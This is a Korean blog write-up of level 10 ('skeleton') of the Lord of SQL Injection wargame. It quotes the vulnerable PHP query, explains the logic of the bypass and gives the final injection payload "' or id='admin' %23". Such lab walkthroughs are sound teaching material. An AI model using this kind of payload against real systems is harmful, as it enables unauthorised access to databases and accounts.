---
title: LOS - 10번 skeleton
category: Lord of SQL Injection
---

# 10번 skeleton

## 문제

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdLlhMC%2FbtrndIkkExe%2FKKNMKcRum9GKhk0Ah3gcRk%2Fimg.png">

## 풀이

solve의 조건은 id==admin 이다.

<br>

준비된 쿼리문은 다음과 같다.

```php
$query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0";
```

지금까지 해온 것처럼,

\$\_GET[pw] 부분에 적절한 쿼리문을 넣어 id='admin'이 정상 처리되게끔 해주면 된다.

<br> 

\$\_GET[pw]를 기준으로

앞부분의 쿼리는 싱글쿼터를 하나 삽입함으로써 FALSE로 만들어주고,

뒷부분은 주석 처리하여 무시되게끔 해주면 될 것 같다.

<br> 

즉, 목표는 준비된 쿼리문을 다음과 같이 변조해주는 것이다.


```php
$query = "select id from prob_skeleton where (id='guest' and pw='') or id='admin' #' and 1=0";
```


① 논리연산자의 실행 순서에 따라 앞부분 조건절은 하나로 묶여 FALSE로 처리됨

② \|\| id='admin' 을 삽입하여 id가 admin인 레코드를 뽑아옴

③ 뒷부분은 주석으로 날려줌


복잡해보이지만 지금까지와 다를 바 없다.

<br> 

최종적으로 입력할 쿼리문은 다음과 같다.

 
```
' or id='admin' %23
```


## 결과

<img  src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdLtQlQ%2FbtrnmPaqyzg%2FOiff8dAAAFhXikNxqLSuK1%2Fimg.png">